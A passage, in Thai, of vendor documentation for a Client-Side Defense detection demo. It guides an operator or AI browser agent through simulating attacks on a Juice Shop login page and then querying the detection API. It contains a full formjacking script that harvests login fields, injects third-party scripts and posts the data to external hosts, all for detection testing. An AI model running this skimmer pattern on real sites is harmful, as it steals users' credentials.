เฟส 2 จะสร้างทราฟฟิกการโจมตีจำลองต่อแอปพลิเคชันที่ได้รับการป้องกัน และยืนยันว่า CSD ตรวจจับได้ เฟส 1 ต้องเสร็จสมบูรณ์ — การตรวจสอบ Step 7 ทั้งหมดต้อง PASS — ก่อนดำเนินการต่อ

## ขั้นตอนที่ 8: การจำลองการโจมตี

<Aside type="note">
ขั้นตอนนี้ต้องใช้การรัน JavaScript ฝั่งเบราว์เซอร์ — `curl` ไม่สามารถกระตุ้นการตรวจจับของ CSD ได้ ผู้ช่วย AI ที่มีเครื่องมือควบคุมเบราว์เซอร์อัตโนมัติ (MCP Chrome DevTools, Playwright, Puppeteer) จะดำเนินการขั้นตอนเหล่านี้โดยตรงโดยใช้ลำดับ **การดำเนินการอัตโนมัติด้วย AI** ด้านล่าง ผู้ปฏิบัติงานที่ไม่มีเครื่องมือควบคุมเบราว์เซอร์อัตโนมัติให้ดำเนินการขั้นตอนด้วยตนเอง
</Aside>

หลังจากโครงสร้างพื้นฐานได้รับการตรวจสอบแล้ว (การตรวจสอบ Step 7 ของเฟส 1 ทั้งหมด PASS) ให้รันสคริปต์จำลองการโจมตีเพื่อสร้างการตรวจจับของ CSD สคริปต์เหล่านี้ถูกกำหนดไว้ในคู่มือ [Trigger Detection](/csd/trigger-detection/) และ [Attack Script Library](/csd/attack-scripts/)

### การดำเนินการอัตโนมัติด้วย AI

ผู้ช่วย AI ที่มีเครื่องมือควบคุมเบราว์เซอร์อัตโนมัติจะรันการจำลองการโจมตีแบบโปรแกรม:

1. **นำทางด้วย initScript** — นำทางไปที่ `about:blank` ก่อนเพื่อให้แน่ใจว่ามี document context ที่สะอาด (หลีกเลี่ยง initScript เก่าจากการนำทางครั้งก่อน) จากนั้น `navigate_page` ไปที่ `http://$F5XC_DOMAINNAME/#/login` พร้อม `initScript` ที่บันทึก `setInterval`, `clearInterval`, `fetch` และ `console.log` แบบ native ก่อนที่ zone.js จะแพตช์ ทำ polling เพื่อรอฟิลด์ฟอร์มล็อกอิน กรอกข้อมูลรับรองผ่าน native `HTMLInputElement.prototype.value` setter และรัน Combined Detection Script แบบ inline ทันที ใช้ initScript ด้านล่างตามที่เขียนไว้ทุกประการ
2. **ปิด Welcome Banner** — `press_key` ด้วย `Escape` เพื่อปิด Welcome Banner ในการเข้าชมครั้งต่อไป แบนเนอร์อาจไม่ปรากฏ (มีการเก็บคุกกี้ไว้) กล่องโต้ตอบการยินยอมคุกกี้จะถูกปิดโดยอัตโนมัติด้วยปุ่ม Escape
3. **รอให้เสร็จสมบูรณ์** — รอ 10 วินาทีเพื่อให้ CDN script load/error callbacks และ fetch promise resolutions ทั้งหมดเสร็จสมบูรณ์
4. **บันทึกหลักฐาน** — `list_console_messages` เพื่อตรวจสอบ `[CSD Demo] Simulation complete` และผลการโหลด CDN; `list_network_requests` กรองตามประเภท `script` และ `fetch` เพื่อตรวจสอบ HTTP status codes (`200`/`201` สำหรับสำเร็จ, `pending` สำหรับคำขอที่ถูกค้างไว้)

**initScript ของเฟส 2 (ใช้ตามที่เขียนไว้ทุกประการ — ห้ามแก้ไข):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**ความไม่เข้ากันของ zone.js** — Juice Shop ใช้ zone.js ของ Angular ซึ่งแพตช์ `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` และ browser API อื่นๆ สิ่งนี้ทำให้เครื่องมือ MCP `evaluate_script`, `fill` และ `click` เกิดข้อผิดพลาด `Cannot read properties of undefined (reading 'call')` ใช้ `navigate_page` กับ `initScript` แทน — `initScript` จะรันก่อนที่ zone.js จะโหลด ดังนั้นคุณสามารถบันทึก native API references และใช้งานใน polling callbacks ได้ initScript ต้องกรอกฟิลด์ฟอร์มโดยใช้ native `HTMLInputElement.prototype.value` setter (ไม่ใช่ `fill`) และรันสคริปต์ตรวจจับแบบ inline (ไม่ใช่ผ่าน `setTimeout` ซึ่ง zone.js อาจดักจับหลังจากโหลดหน้า) ดูรายละเอียดที่ [Trigger Detection — AI-Automated Execution](/csd/trigger-detection/#ai-automated-execution)
</Aside>

<Aside type="note">
**การสะสม initScript** — การเรียก `navigate_page` แต่ละครั้งที่มีพารามิเตอร์ `initScript` จะเพิ่มสคริปต์ลงในรายการถาวรที่จะรันในทุกการโหลดเอกสารครั้งต่อไป เพื่อหลีกเลี่ยงสคริปต์เก่ารบกวน ให้นำทางไปที่ `about:blank` ระหว่างการรัน หรือใช้ `new_page` กับ `isolatedContext` เพื่อสร้าง browser context ใหม่ที่สะอาด
</Aside>

<Aside type="note">
**การบันทึก native `fetch` ใน initScript** — initScript จะบันทึก `window.fetch.bind(window)` ก่อนที่ zone.js จะแพตช์ สิ่งนี้ทำให้การเรียก fetch ทำงานได้อย่างถูกต้องโดยไม่มีข้อผิดพลาด `Cannot read properties of undefined` ของ zone.js initScript เดียวกัน (ที่มี native `fetch` ถูกบันทึกไว้) จะถูกใช้สำหรับทั้งการรันโจมตีของเฟส 2 และเฟส 3 — การบรรเทาผลกระทบของ CSD จะไม่ดักจับการเรียก `fetch()` ดังนั้นการบันทึก native reference จึงไม่ส่งผลกระทบต่อพฤติกรรมการบรรเทาผลกระทบ
</Aside>

<Aside type="caution">
**404 ชั่วคราวจาก origin** — ในการนำทางครั้งแรกไปยังแอปพลิเคชัน Angular, `polyfills.js` หรือสคริปต์แอปอื่นๆ อาจส่งคืน HTTP 404 ชั่วคราวจากเซิร์ฟเวอร์ต้นทาง สิ่งนี้ทำให้ Angular ไม่สามารถ bootstrap ได้ ส่งผลให้หน้าว่างเปล่าโดยไม่มีฟอร์มล็อกอิน 404 นี้เป็นแบบชั่วคราว — คำขอครั้งต่อไปจะส่งคืน 200 หรือ 304 **การกู้คืน:** นำทางไปที่ `about:blank` รอ 2 วินาที จากนั้นลองนำทางอีกครั้ง หากปัญหายังคงอยู่หลังจากลองหลายครั้ง ให้ตรวจสอบสุขภาพของ origin ผ่าน load balancer path (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`)
</Aside>

### การดำเนินการด้วยตนเอง

ผู้ปฏิบัติงานที่ไม่มีเครื่องมือควบคุมเบราว์เซอร์อัตโนมัติให้ดำเนินการขั้นตอนด้วยตนเอง:

1. **นำทาง** ไปยังหน้าล็อกอินของแอปพลิเคชันที่ได้รับการป้องกัน: `http://xF5XC_DOMAINNAMEx/#/login`
2. **กรอกข้อมูลรับรองจำลอง** — พิมพ์ `test@example.com` ในช่อง Email และ `P@ssword123` ในช่อง Password (อย่าส่งฟอร์ม)
3. **เปิด DevTools** — กด **F12** และสลับไปที่แท็บ **Console**
4. **รัน Combined Detection Script** — วางสคริปต์จาก [Trigger Detection &mdash; Run the Combined Simulation Script](/csd/trigger-detection/#run-the-combined-simulation-script) ลงในคอนโซลแล้วกด Enter
5. **ตรวจสอบผลลัพธ์ในคอนโซล** — ยืนยันว่าผลลัพธ์แบบเฟสของ `[CSD Demo]` แสดง: การเก็บเกี่ยวฟิลด์ฟอร์ม, การ inject สคริปต์จาก 4 โดเมน CDN และการส่งข้อมูลออกไปยัง 2 จุดปลายทาง

### สิ่งที่ถูกกระตุ้น

| สัญญาณ | พฤติกรรม | การตรวจจับ |
| --- | --- | --- |
| การเก็บเกี่ยวฟิลด์ฟอร์ม | อ่านค่า input ของอีเมลและรหัสผ่าน | สคริปต์อ่านฟิลด์ฟอร์มที่ละเอียดอ่อน — ถูกตั้งค่าสถานะเป็นความเสี่ยงสูง |
| การ inject สคริปต์ | Inject แท็ก `&lt;script&gt;` 4 ตัวจาก `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | ตรวจพบโดเมนสคริปต์ของบุคคลที่สามใหม่สูงสุด 4 โดเมน (ความพร้อมใช้งานของ CDN แตกต่างกัน) |
| การส่งข้อมูลออก | ส่งข้อมูลที่เก็บเกี่ยวผ่าน `fetch` ไปยัง `www.httpbin.org` และ `jsonplaceholder.typicode.com` | การเรียกเครือข่ายไปยังโดเมนภายนอก |

<Aside type="note">
**ความพร้อมใช้งานของ CDN แตกต่างกัน** ไม่ใช่สคริปต์ CDN ทั้ง 4 ตัวจะโหลดได้ในทุกครั้งที่รัน — ข้อจำกัดทรัพยากรเบราว์เซอร์ สภาพเครือข่าย หรือการจำกัดอัตราของ CDN อาจทำให้บางตัวล้มเหลวด้วย `ERR_INSUFFICIENT_RESOURCES` หรือหมดเวลา การจำลองสำเร็จหากสคริปต์ CDN **ใดก็ตาม** โหลดได้ CSD ตรวจจับความพยายาม inject โดยไม่คำนึงว่าสคริปต์จะโหลดสำเร็จหรือไม่ — การสร้างแท็ก `&lt;script&gt;` เองคือสัญญาณการตรวจจับ

ในกรณีที่รุนแรง `ERR_INSUFFICIENT_RESOURCES` สามารถลุกลามไปเป็นความล้มเหลวระดับหน้า — หน้าทั้งหมดว่างเปล่า ภาพหน้าจอหมดเวลา และ `take_snapshot` ล้มเหลว สิ่งนี้มักเกิดขึ้นหลังจากการนำทางหลายครั้งที่มี initScript หนักสะสมใน browser context เดียวกัน **การกู้คืน:** ใช้ `new_page` กับ `isolatedContext` เพื่อสร้าง browser context ใหม่ที่สะอาด จากนั้นลองอีกครั้งจากลำดับ `about:blank` → `navigate_page` พร้อม initScript สิ่งนี้แตกต่างจากความล้มเหลวของสคริปต์ CDN แต่ละตัว ซึ่งไม่ส่งผลกระทบต่อความสำเร็จของการจำลอง
</Aside>

<Aside type="tip">
หลังจากรันการจำลองการโจมตี ให้ใช้ polling loop แบบกำหนดแน่นอนนี้เพื่อรอการตรวจจับ:

1. สอบถาม `/detected_domains` ทุก 60 วินาที
2. หาก DET-3 ผ่าน (โดเมน exfil ปรากฏใน `/detected_domains`) ให้ดำเนินการต่อไปยังขั้นตอนที่ 9 ทันที
3. หากยังว่างอยู่หลังจากสอบถาม 10 ครั้ง (10 นาที) ให้ตรวจสอบสถานะ CSD (เฟส 1 ขั้นตอนที่ 5) และการลงทะเบียนโดเมนที่ได้รับการป้องกัน (เฟส 1 ขั้นตอนที่ 6) — หนึ่งในสิ่งเหล่านี้น่าจะกำหนดค่าผิด
4. หากยังว่างอยู่หลังจากสอบถาม 30 ครั้ง (30 นาที) ให้หยุดและรายงานต่อผู้ปฏิบัติงาน — อย่าดำเนินการต่อไปยังเฟส 3

สำหรับการจำลองเป้าหมายเพิ่มเติม (หมวดหมู่การโจมตีแต่ละรายการ, การทดสอบความเครียดการตรวจจับสูงสุด) ดู [Attack Script Library](/csd/attack-scripts/)
</Aside>

### หลักฐาน

ผู้ช่วย AI ควรรายงานสิ่งต่อไปนี้ สำหรับการดำเนินการอัตโนมัติด้วย AI หลักฐานจะถูกบันทึกแบบโปรแกรมผ่าน `list_console_messages` (ฟังก์ชัน polling ของ initScript จะบันทึกผลลัพธ์ไปยังคอนโซล) สำหรับการดำเนินการด้วยตนเอง ผู้ปฏิบัติงานจะอ่านผลลัพธ์จากคอนโซลเบราว์เซอร์

| การตรวจสอบ | ที่คาดหวัง | สถานะ |
| --- | --- | --- |
| โหลดหน้าล็อกอินแล้ว | `200 OK` ที่ `http://$F5XC_DOMAINNAME/#/login` | PASS / FAIL |
| รันสคริปต์คอนโซลแล้ว | `[CSD Demo] Simulation complete` ในผลลัพธ์คอนโซล | PASS / FAIL |
| ฟิลด์ที่เก็บเกี่ยวแล้ว | จำนวน &gt; 0 ในผลลัพธ์คอนโซล | PASS |
| สคริปต์ที่ inject แล้ว | 1–4 โดเมน CDN ในผลลัพธ์คอนโซล (บางตัวอาจล้มเหลวด้วยข้อผิดพลาดทรัพยากร) | PASS หากมีโดเมน CDN ใดปรากฏ |
| ช่องทาง exfil | ความพยายาม fetch POST 2 ครั้งในผลลัพธ์คอนโซล | PASS |

<Aside type="tip">
หากใบรับรอง HTTPS LB ถูกต้อง (`CertificateValid`) คุณอาจเลือกรันการจำลองกับ `https://$F5XC_DOMAINNAME/#/login` ได้เช่นกัน สิ่งนี้ไม่จำเป็นสำหรับการดำเนินการสาธิต
</Aside>

## ขั้นตอนที่ 9: การตรวจสอบการตรวจจับผ่าน API

สอบถาม CSD API endpoints เพื่อยืนยันว่ามีการตรวจจับปรากฏ ใช้ polling loop: สอบถาม `/detected_domains` ทุก 60 วินาที; ดำเนินการต่อทันทีที่ DET-3 ผ่าน หาก DET-3 ไม่ผ่านหลังจาก 10 นาที ให้ตรวจสอบการกำหนดค่า CSD หาก DET-3 ไม่ผ่านหลังจาก 30 นาที ให้หยุดและรายงานต่อผู้ปฏิบัติงาน endpoints เหล่านี้ถูกบันทึกไว้ใน [API Reference](/csd/api-reference/) และใช้การยืนยันตัวตนและ namespace เดียวกันกับขั้นตอนก่อนหน้า

<Aside type="note">
**ลำดับการประมวลผลของ endpoint:** `/detected_domains` จะถูกเติมข้อมูลก่อนและเป็นตัวบ่งชี้หลักว่า pipeline ของ CSD ทำงานอยู่ `/scripts` และ `/formFields` จะถูกเติมข้อมูลตามตารางการประมวลผลแบ็กเอนด์ที่ช้ากว่าและอาจยังว่างอยู่เป็นเวลา 20–30 นาทีแม้จะรันการจำลองหลายครั้ง หาก `/detected_domains` แสดงโดเมน exfil (`www.httpbin.org`, `jsonplaceholder.typicode.com`) ให้ถือว่าการจำลองถูกตรวจจับสำเร็จและดำเนินการต่อ — การตรวจสอบ DET-1 ด้านล่างสะท้อนสิ่งนี้
</Aside>

### สคริปต์ที่ตรวจจับได้

สอบถามสคริปต์ที่ตรวจจับได้ในช่วง 24 ชั่วโมงที่ผ่านมา:

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| ฟิลด์ | ที่คาดหวัง | สถานะ |
| --- | --- | --- |
| `total` | &gt; 0 (ตรวจจับสคริปต์ได้) | PASS หาก &gt; 0; PENDING หากเป็น 0 แต่ `/detected_domains` แสดงโดเมน exfil |
| ชื่อสคริปต์ | รวมโดเมน CDN (`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) ใน `script_name` | PASS หากโดเมน CDN ที่ inject ปรากฏ |

### โดเมนที่ตรวจจับได้

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
```

| ฟิลด์ | ที่คาดหวัง | สถานะ |
| --- | --- | --- |
| `total_domains` | &gt; 0 | PASS หาก &gt; 0 |
| รายการโดเมน | รวมโดเมน CDN และ exfil | PASS หากโดเมนที่คาดหวังปรากฏ |

### ฟิลด์ฟอร์ม

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| ฟิลด์ | ที่คาดหวัง | สถานะ |
| --- | --- | --- |
| `total` | &gt; 0 | PASS หาก &gt; 0; PENDING หากเป็น 0 แต่ DET-3 ผ่าน |
| `name` | รวม `email`, `password` | PASS หากฟิลด์ที่ละเอียดอ่อนปรากฏ |
| `sensitivity` | `Sensitive` สำหรับฟิลด์ email/password | PASS หาก ML จำแนกได้ถูกต้อง |

<Aside type="note">
**การประมวลผลฟิลด์ฟอร์มช้ากว่าการตรวจจับโดเมน** endpoint `/formFields` อาจส่งคืนฟิลด์ที่มี metadata บางส่วนในการสอบถามครั้งแรก การจำแนกความละเอียดอ่อนของ ML (`Sensitive` vs `Not Sensitive`) จะถูกเติมข้อมูลหลังจากการประมวลผลแบ็กเอนด์เสร็จสิ้น — ซึ่งอาจใช้เวลา 20–30 นาทีหลังจากการรันการจำลองครั้งแรก หากฟิลด์แสดงแต่ยังไม่มีการจำแนก ให้สอบถามอีกครั้งในภายหลัง DET-3 (`/detected_domains`) เป็นเกณฑ์ผ่านหลัก
</Aside>

### สรุปหลักฐานเฟส 2

หลังจากการสอบถามการตรวจจับทั้งหมด ให้นำเสนอสถานะการตรวจจับสุดท้าย:

| รหัสทดสอบ | การตรวจสอบ | สถานะ |
| --- | --- | --- |
| DET-1 | ตรวจจับสคริปต์ได้ (endpoint `/scripts`) | PASS หาก &gt; 0; PENDING หากว่างแต่ DET-3 ผ่าน |
| DET-2 | ตรวจจับโดเมน CDN ได้ | PASS / FAIL |
| DET-3 | ตรวจจับโดเมน exfil ได้ (endpoint `/detected_domains`) | **ตัวบ่งชี้หลัก** — PASS หาก `www.httpbin.org` หรือ `jsonplaceholder.typicode.com` ปรากฏ |
| DET-4 | ตรวจจับฟิลด์ฟอร์มได้ (endpoint `/formFields`) | PASS หาก &gt; 0; PENDING หากว่างแต่ DET-3 ผ่าน |

<Aside type="note">
**เกณฑ์ผ่านขั้นต่ำเพื่อดำเนินการต่อไปยังเฟส 3:** DET-3 ต้อง PASS (โดเมน exfil มองเห็นได้ใน `/detected_domains`) DET-1 และ DET-4 อาจแสดง PENDING ในการใช้งานครั้งแรกหรือหลังจากสร้างใหม่ — นี่เป็นเรื่องปกติ หาก DET-3 แสดง FAIL เช่นกันหลังจาก 30 นาที ให้ตรวจสอบว่า CSD เปิดใช้งานอยู่ (เฟส 1 ขั้นตอนที่ 5) โดเมนที่ได้รับการป้องกันถูกลงทะเบียนแล้ว (เฟส 1 ขั้นตอนที่ 6) และแท็ก CSD JS ถูก inject (การตรวจสอบ JS Configuration ของเฟส 1 ขั้นตอนที่ 7)
</Aside>
